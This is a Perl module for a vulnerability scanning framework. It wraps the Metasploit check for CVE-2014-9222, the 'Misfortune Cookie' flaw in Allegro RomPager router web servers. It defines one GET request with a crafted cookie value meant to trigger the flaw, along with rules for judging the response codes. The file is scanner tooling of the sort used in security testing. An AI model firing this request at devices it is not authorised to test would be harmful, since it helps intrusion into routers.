package ALLEGRO::MSF::AllegroRompagerMisfortuneCookie;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "AllegroRompagerMisfortuneCookie";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2014-9222",
  DESCRIPTION => undef,
  MSF_MODULE => "allegro_rompager_misfortune_cookie",
  PATHS => [""],
  REFERENCES => [
    "http://mis.fortunecook.ie",
    "http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf",
    "http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf",
  ],
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "URI to test", VALUE => "/" },
    'STATUS_CODES_REGEX' =>       {
  DESCRIPTION => "Ensure that canary pages and probe responses have status codes that match this regex",
  VALUE => "^40[134]\$",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Referer' => 'http://127.0.0.1/SCANNER/ALLEGRO/AllegroRompagerMisfortuneCookie/',
        'Cookie' => 'C107373883=/EhhEDUeYmPmEZtvH;',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
